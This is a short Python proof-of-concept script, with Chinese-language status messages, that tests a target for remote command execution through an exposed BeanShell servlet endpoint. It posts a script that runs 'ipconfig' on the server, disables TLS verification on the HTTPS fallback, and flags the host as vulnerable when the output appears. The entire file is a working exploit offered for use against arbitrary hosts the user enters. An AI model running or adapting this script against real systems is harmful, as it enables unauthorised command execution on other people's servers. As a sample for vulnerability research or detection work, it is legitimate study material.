import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def POC_1(url):
    header = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
"Content-Type":"application/x-www-form-urlencoded",
"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"}
    
    if "http://" in url or "https://" in url:
        html = requests.post(url+"/servlet/~ic/bsh.servlet.BshServlet", data = 'bsh.script=exec("ipconfig");',headers = header, timeout = 5)
        if "DNS" in html.text:
            print(f"\033[32m[o] 目标 {url} 存在漏洞\033[0m")
            # print(html.text)
        else:
            print(f"\033[31m[x] 目标 {url} 不存在漏洞\033[0m")
    else:
        try:
            target = f"http://{url}/servlet/~ic/bsh.servlet.BshServlet"
            print(target)
            html = requests.post(target, data = 'bsh.script=exec("ipconfig");',headers = header, timeout = 5)
            if "DNS" in html.text:
                print(f"\033[32m[o] 目标 {url} 存在漏洞\033[0m")
                # print(html.text)
            else:
                print(f"\033[31m[x] 目标 {url} 不存在漏洞\033[0m")
        except:
            try:
                target = f"https://{url}/servlet/~ic/bsh.servlet.BshServlet"
                html = requests.post(target, data = 'bsh.script=exec("ipconfig");',headers = header,verify=False, timeout= 5)
                if "DNS" in html.text:
                    print(f"\033[32m[o] 目标 {url} 存在漏洞\033[0m")
                    # print(html.text)
            except:
                print(f"\033[31m[x] 目标 {url} 不存在漏洞\033[0m")


if __name__ == '__main__':
    target = input("Target>>>")
    POC_1(target)